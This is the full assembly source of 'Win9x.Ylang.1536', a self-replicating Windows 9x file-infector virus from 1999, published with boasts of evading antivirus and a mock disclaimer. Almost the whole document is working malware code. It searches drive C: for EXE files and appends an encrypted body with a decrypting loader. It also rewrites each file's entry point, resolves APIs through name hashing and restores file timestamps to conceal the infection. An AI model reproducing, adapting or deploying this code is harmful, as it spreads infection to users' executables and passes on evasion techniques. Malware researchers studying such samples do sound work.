   .386
   .model flat




   ;WIN9X.YLANG.1536 VIRUS BY DR.L /[TECHNOLOGICAL ILLUSION]/V.19/Nov-Dec 1999
   ;
   ;This is my first virus designed for ms-windows
   ;I have tested it only under Win95 os, but i think it works on win98 too!
   ;The virus isn't destructive as far i know but it's a virus, so be carefull!
   ;The current version of Win9x.Ylang is not detected by main anti-virus
   ;programs (avp don't caught it)...so once again BE CAREFULL!
   ;
   ;
   ;Description:
   ;This virus search for PE-exe files using a directory-tree search algo
   ;(hi LJ! ) on drive C:
   ;The virus appends to the end of code section  a loader.
   ;The entry point is modidified to point to this loader.
   ;The loader aim is to decrypt the main code put at the end of last section
   ;and to put the decrypted code into the stack and...executes it there!
   ;Result: the virus dont modify sections flag, this means if a section isn't
   ;originally writable ,after infection it has still read only attributes!
   ;There is one exception...first section is marked as Executable...
   ;but in most of the cases...first section is the code section of host!
   ;Previous version of this virus is detected by avp !
   ;The first version of Win9x.Ylang was only running only on Win95...not Win98..
   ;The reason was hard to find for me ...
   ;In kernel32.dll of Win95, the apis with no names are put in first places in the
   ;big table of pointers to apis addresses...in Win98 isn't true at all!
   ;(Don't trust no one...er...i mean: in vx oriented zines ,infos aren't always
   ;true! keep in Mind this point when trying to design viruses ;))
   ;The last point is ,this virus uses crc-like/checksum technics to
   ;retrieve apis addresses needed to perform infection.
   ;
   ;Known bugs: the virus isn't fully EXE-packed aware !
   ;this means some infected packed EXE-files will not work after infection :(
   ;but most packed files will only warn you it was modified and will still work
   ;after infection
   ;
   ;
   ;
   ;
   ;Thanks go to:
   ;(no order ;)
   ;                 Star0     : 32 bits crc-like rulez!
   ;                 Evul      : your help was usefull
   ;                 Cryptic   : tx to have tested the 1st version
   ;                 T!%%%     : Destroy isn't play! ;) (better not to sign
   ;                           : your work!;))
   ;                           ; tx for optimization advice ;)
   ;                 Darkman   : tx to publish this source!
   ;                 TechnoP   : are you still living? (contact me!)
   ;                 Lord Julus: Vxtazy #1 is good...
   ;                           : but can u optimize your code?
   ;                           : optimization sometime= code more clear!
   ;                 V****     : RSA rulez!
   ;                 Lethal    : FR**** do it better!
   ;                 MI*T      : IRC kills viruses coding :(
   ;                 delar**0  : Learn asm32win,troyan are better in asm32win!
   ;                 dyrdyr    : Arithmetic rules!
   ;
   ;                 Tx go to lota people from v**us channel ,
   ;                 you know, who you  are!
   ;
   ;DISCLAIMER: i m not responsible for misuse of this virus,same way
   ;fireguns enterprises can't be held for responsible when a teenager
   ;kills 10 others teenagers using their products!
   ;This virus was written for educationnal aims .
   ;if you don't know what you're doing...please don't use it!









    extrn  ExitProcess:PROC

   .data
    db 0

   .code                                          ;executable code starts here

   HOST:



   ;***** Loader part

           jmp BeginVir0

           mov eax,EndVir-BeginVir               ;not necessary
           mov eax,LoaderLength                  ;


           push 0

           call ExitProcess

    BeginVir0:

           mov edx,[esp]

           mov eax,esp

           sub eax,VirLength0

           push eax



   ;***** End of loader part


    BeginVir:                                     ;real start of virus


   ;***** Search kernel32.dll address in memory
   ;
   ;***** Out:edx=kernel32.dll address

           mov eax,edx

    Loop:

           dec edx

           cmp word ptr [edx],"ZM"

           jnz Loop

    MZ_found:

           mov ecx,edx

           mov ecx,[ecx+03ch]

           add ecx,edx

           cmp ecx,eax

           jg Loop                           ;this test avoid fault page

           cmp word ptr [ecx] ,"EP"

           jnz Loop

   ;***** end of search kernel routine



   ;[Compute delta offset ]:

           call Delt

    Delt:

           pop ebp

           sub ebp,offset Delt




           pop dword ptr [_Stack+ebp]              ;save original

           add dword ptr [_Stack+ebp],VirLength0   ;stack address


   ;***** Searching Apis Addresses

   ;In : edx=IMAGE BASE of KERNEL32
   ;Out: Searched Apis addresses are put in a Table of Dword

           mov eax,[edx+3ch]      ;eax=RVA of PE-header

           add eax,edx            ;eax=Address of PE-header

           mov eax,[eax+78h]      ;eax=RVA of EXPORT DIRECTORY section

           add eax,edx            ;eax=Address of EXPORT DIRECTORY section


           mov esi,[eax+20h]      ;esi=RVA of the table containing pointers
                                  ;to the names of exported functions

           add esi,edx            ;esi=Address of this table,
                                  ;a pointer to the name of the first
                                  ;exported function




           xor ebx,ebx                           ;Api number

           dec ebx

           mov ecx,ApiNb                         ;number of Apis remaining

           sub esi,4

    MainLoop:

           add esi,4

           inc ebx

   ;***** Crc computing of the current Api name
   ;
   ;In:
   ;     esi: RVA of name
   ;
   ;Out: Crc variable  contains the Crc of current name


    ComputeCrc:

           pushad

           mov esi,dword ptr [esi]

           add esi,edx


           xor ecx,ecx

           xor eax,eax

    Again:

           Lodsb

           or al,al

           jz SeeU

           add cl,al

           rol eax,cl

           add ecx,eax

           jmp Again

    SeeU:

           mov dword ptr [Crc+ebp],ecx

           popad


   ;***** End of crc computing routine



   ;***** test Crc


   ;In:  Esi: Current Api name address
   ;
   ;Out: Esi= following name
   ;     Ecx= Api (pointer) # in  the "table of names"





    TestCrc:

           push eax

           mov eax,dword ptr [Crc+ebp]

           mov ecx,ApiNb+1

           lea edi,ApiList+ebp

           repne scasd

           pop eax

           jecxz MainLoop

           Found:

           pushad

           add edi,offset CloseHandle-(offset ApiList+4) ;Api position
                                                         ;in our table

           mov ecx,dword ptr [eax+36]

           add ecx,edx

           lea ecx,[ecx+2*ebx]

           mov bx,word ptr [ecx]

           mov ecx,dword ptr [eax+1ch]

           add ecx,edx

           mov ecx,dword ptr [ecx+4*ebx]

           add ecx,edx

           mov dword ptr [edi],ecx

           popad

           Loop MainLoop

   ;***** End of crc test routine




   ;***** End of Apis searching routine



   ;***** Prepare return to host

           push dword ptr [OldEip+ebp]

           pop  dword ptr [CurrentEip+ebp]

   ;***** End prepare



   ;[Save current directory]:

           lea eax,DirExe+ebp

           push eax

           push 260

           call Dword ptr [GetCurrentDirectoryA+ebp]


   ;***** Main routine (directory-tree search algorythm)


           mov dword ptr [Counter+ebp],3

           mov dword ptr [Depth+ebp],0

           mov dword ptr [FileName+ebp],"\:C"

    Find0:
           inc dword ptr [Depth+ebp]

           push ebx

           lea eax,FileName+ebp

           push eax

           call dword ptr [SetCurrentDirectoryA+ebp]


   ;******  InfectCurrentDir


           lea esi,FileAttributes+ebp

           push esi

           lea edi,FindMatch+ebp

           push edi

           call dword ptr [FindFirstFileA+ebp]

           mov ebx,eax

           inc eax

           jz FindF

           call Infect


    Next:

           push esi

           push ebx

           call [FindNextFileA+ebp]

           or eax,eax

           jz FindF

           call Infect

           jmp Next

   ;***** End of infect current dir routine


   ;[Findfirst dir]:

    FindF:
            lea esi,FileAttributes+ebp

            push esi

            lea edi,FindMatch2+ebp

            push edi

            call dword ptr [FindFirstFileA+ebp]

            mov ebx,eax

            inc eax

            jz Updir0

    Find:
            mov eax,dword ptr [FileAttributes+ebp]

            and eax,10h

            jz FindN

            cmp byte ptr [FileName+ebp],"."

            jnz Find0

   ;[FindNext dir routine]:

    FindN:
           lea esi,FileAttributes+ebp

           push esi

           push ebx

           call dword ptr [FindNextFileA+ebp]

           or eax,eax

           jnz Find

    Updir:
           push ebx

           call dword ptr [FindClose +ebp]

    Updir0:
           dec dword ptr [Depth+ebp]

           jz Exit

           pop ebx

           lea eax,DotDot+ebp

           push eax

           call dword ptr [SetCurrentDirectoryA+ebp]

           jmp FindN

    Exit:                                         ;jmp to host code




   ;[Restore saved directory]:

           lea eax,DirExe+ebp

           push eax

           call dword ptr [SetCurrentDirectoryA+ebp]

           mov esp,dword ptr [_Stack+ebp]

           db 68h                                 ;push

           CurrentEip dd 0                        ;CurrentEip

   ;[Jump to host original code]:

           ret

   ;***** End main routine

    Infect:




          pushad


    TestFile:


          add dword ptr [FileSize+ebp],VirLength


   ;***** Test if the file is a true PE-executable file

          call OpenFileStuff

          jc ExitInfectError

          push edx                                ;save mapping address

          cmp dword ptr [edx+3ch],200h            ;Avoid Fault Page

          ja ExitInfectError0


          add edx,dword ptr [edx+3ch]             ;edx points to PE-header

          cmp word ptr [edx],"EP"                 ;true PE exe there?

          jnz ExitInfectError0


   ;***** End of EXE-PE test



   ;***** Already infected?

          pop ecx

          cmp word ptr [ecx+12h],"IT"             ;infected?

          jz ExitInfectError

          push ecx

   ;**** End of infection test





   ;****** Search for header of target last section


          mov edi,edx

          add edi,18h                             ;edi=beginning of optional header


   ;[Compute the return address to target code]:

          mov ebx,dword ptr [edi+10h]             ;ebx=Entry Point RVA

          add ebx,dword ptr [edi+1ch]             ;ebx=Entry Point address in
                                                  ;memory (add ImageBase)

          mov dword ptr [OldEip+ebp],ebx          ;save it

          movzx ecx,word ptr [edx+14h]            ;cx=size of optionnal header

          add edi,ecx                             ;edi points to 1st section header

          movzx ecx,word ptr [edx+06h]            ;cx= number of sections

          mov ebx,edi                             ;ebx points on 1st section header

          or dword ptr [ebx+24h],20000000h        ;Set code attribute in 1st section


   ;[Search for last section]:

          mov eax,028h

          dec ecx

          push edx

          mul ecx

          pop edx

          mov esi,edi

          add esi,eax


   ;Now:
   ;esi=beginning of last section header
   ;ebx=beginning of 1st section header (most of the time it's the code section)




   ;[Compute the place on disk where to put the code in the last section]:

           pop edi                          ;edi holds mapaddress

           cmp dword ptr [esi+08],0         ;don't want infect files
                                            ;with pointer2rawdata=null
                                            ;(see wwp32 packed Exe-files)
                                            ;if we try ...file is overwritten!

           jz ExitInfectError

           push edi


   ;[Compute position on disk of loader code beginning]:


           add edi,dword ptr [ebx+10h]

           add edi,dword ptr [ebx+14h]

           sub edi,LoaderLength

           xchg edi,eax

           pop edi                      ;restore mapaddress

           push eax                     ;save pointer to code loader

           cmp byte ptr [eax],0         ;nope...not enough free bytes left
                                        ;in end of code section...

           jnz  ExitInfectError0        ;don't want to corrupt the file!

           inc dword ptr [Key+ebp]      ;increment infection counter



           mov word ptr [edi+12h],"IT"  ;mark the infected target

           mov dword ptr [edx+3ch],200h ;set FileAligment=200h





           add edi,dword ptr [esi+14h]      ;esi=last section pointer on disk

           add edi,dword ptr [esi+10h]      ;add rounded up last section raw-size


   ;[Compute beginning of code in the last section ,in memory]:


           mov ecx,dword ptr [esi+0ch]      ;last section address in memory

           add ecx,dword ptr [esi+10h]      ;add last section rounded up size

           add ecx,dword ptr [edx+18h+1ch]  ;add address base of target

           mov dword ptr [LastSectionCode+ebp],ecx

   ;[Update size field in target optional header]:

           mov ecx,VirLength

           add dword ptr [edx+50h],ecx

   ;[Update size fields in target last section header]:

           add dword ptr [esi+10h],ecx

           push dword ptr [esi+10h]

           pop  dword ptr [esi+8]

   ;[Copy code in the last section]:

           mov ecx,(EndVir-BeginVir+3)/4

           lea esi,BeginVir+ebp

    Encrypt:

           call Crypt

   ;[Compute new Entry Point]:

           mov edi,dword ptr [ebx+0ch]

           add edi,dword ptr [ebx+10h]

           mov ecx,LoaderLength        ;this value is used several times after

           sub edi,ecx                 ;so the use of sub edi,LoaderLength
                                       ;isn't a good choice for optimisation
                                       ;aim :(

           push dword ptr [ebx+10h]

           pop  dword ptr [ebx+8]

           mov dword ptr [edx+28h],edi ;Eip field in optional header updated

   ;[Copy loader code to target file on disk]:

           pop edi                     ;restore pointer (on disk) to code loader

           lea esi,BeginLoader+ebp

           repne movsb

           call CloseFileStuff

           popad

           dec dword ptr [Counter+ebp]

           jz Exit

           ret


    ExitInfectError0:

           pop eax



    ExitInfectError:

           sub dword ptr [FileSize+ebp],VirLength

           call CloseFileStuff

           popad

           ret

    OpenFileStuff:

           push 0

           push 0

           push 3

           push 0

           push 1

           push 80000000h or 40000000h              ;Read and Code abilities

           lea eax,FileName+ebp

           push eax

           call dword ptr [CreateFileA+ebp]

           mov  dword ptr [FileHandle+ebp],eax      ;save FileHandle

           push 0

           push dword ptr [FileSize+ebp]

           push 0

           push 4

           push 0

           push dword ptr [FileHandle+ebp]

           call dword ptr [CreateFileMappingA+ebp]

           mov  dword ptr [MapHandle+ebp],eax

           push dword ptr [FileSize+ebp]

           push 0

           push 0

           push 2

           push dword ptr [MapHandle+ebp]

           call dword ptr [MapViewOfFile+ebp]

           or eax,eax

           jz ExitOpenFileStuffError

           mov dword ptr [MapAddress+ebp],eax     ;eax=Address of Mapping

           xchg eax,edx

           clc


           ret

    ExitOpenFileStuffError:

           stc


           ret



    CloseFileStuff:


    UnMap:
           push dword ptr [MapAddress+ebp]

           call dword ptr [UnmapViewOfFile+ebp]

    CloseMapHandle:

           push dword ptr [MapHandle+ebp]

           call dword ptr [CloseHandle+ebp]


    RestoreTime:

           lea eax,LastWriteTime+ebp

           push eax

           lea eax,LastAccessTime+ebp

           push eax

           Lea eax,CreationTime+ebp

           push eax

           push dword ptr [FileHandle+ebp]

           call dword ptr [SetFileTime+ebp]

    ResizeFile:

           push 0

           push 0

           push dword ptr [FileSize+ebp]

           push dword ptr [FileHandle+ebp]

           call dword ptr [SetFilePointer+ebp]

    MarkEndOfFile:

           push dword ptr [FileHandle+ebp]

           call dword ptr [SetEndOfFile+ebp]


    CloseFile:

           push dword ptr [FileHandle+ebp]

           call dword ptr [CloseHandle+ebp]

    RestoreFileAttributs:

           push dword ptr [FileAttributes+ebp]

           lea eax,FileName+ebp

           push eax

           call dword ptr [SetFileAttributesA+ebp]

           ret


    BeginLoader:

           mov eax,esp

           mov edx,dword ptr [esp]

           sub eax,VirLength0

           mov esp,eax

           push eax

           push eax             ;prepare jump to virus

           xchg eax,edi         ;added to modify scan string

           mov ecx,(VirLength+3)/4



           db 0beh              ;mov esi,****

           LastSectionCode dd 0

    Crypt:

           lodsd

           db 35h

           Key dd 0aaaaaaa9h;0a1def07ch

           stosd

           dec ecx

           jnz Crypt

           ret                  ;go to beginning of code

    EndLoader:






    Constants:

           MaxPath                 equ 260
           VirLength               equ 1536
           VirLength0              equ EndVir0-BeginVir
           ApiNb                   equ 14
           LoaderLength            equ EndLoader-BeginLoader

           OldEip                  dd 00401002h
           FindMatch               db  "*.exe",0
           FindMatch2              db  "*.*",0
           DotDot                  db  "..",0
           Signature               db "Win9x.Ylang.1536/v.19/DrL/Dec99"

           ApiList                 dd 0fdbe9ddfh  ;CloseHandle
                                   dd 04b00fba1h  ;CreateFileA
                                   dd 00d6ea22eh  ;CreateFileMappingA
                                   dd 0be7b8631h  ;FindClose
                                   dd 0c915738fh  ;FindFirstFileA
                                   dd 08851f43dh  ;FindNextFileA
                                   dd 028f8c6fbh  ;GetCurrentDirectoryA
                                   dd 032beddc3h  ;MapViewOfFile
                                   dd 08e0e5487h  ;SetCurrentDirectoryA
                                   dd 0bc738ae6h  ;SetEndOfFile
                                   dd 050665047h  ;SetFileAttributesA
                                   dd 06d452a3ah  ;SetFilePointer
                                   dd 09f69de76h  ;SetFileTime
                                   dd 0fae00d65h  ;UnmapViewOfFile


    EndVir:

           FileHandle              dd 0
           MapHandle               dd 0
           HostNewRawSize          dd 0
           MapAddress              dd 0
           NewEIP                  dd 0
           Counter                 dd 0
           Crc                     dd 0
           _Stack                  dd 0
           Depth                   dd 0


          ;ApiAddress
          CloseHandle              dd 0
          CreateFileA              dd 0
          CreateFileMappingA       dd 0
          FindClose                dd 0
          FindFirstFileA           dd 0
          FindNextFileA            dd 0
          GetCurrentDirectoryA     dd 0
          MapViewOfFile            dd 0
          SetCurrentDirectoryA     dd 0
          SetEndOfFile             dd 0
          SetFileAttributesA       dd 0
          SetFilePointer           dd 0
          SetFileTime              dd 0
          UnmapViewOfFile          dd 0

          FileAttributes           dd ?               ; attributes
          CreationTime             dd 0,0             ; time of creation
          LastAccessTime           dd 0,0             ; last access time
          LastWriteTime            dd 0,0             ; last modificationm
          FileSizeHigh             dd ?               ; filesize
          FileSize                 dd ?               ;
          Reserved0                dd ?               ;
          Reserved1                dd ?               ;
          FileName                 db MaxPath DUP (0) ; long filename

          AlternateFileName        db 13 DUP (?)      ; short filename
          DirExe                   db MaxPath DUP (0h)

    EndVir0:


    end HOST
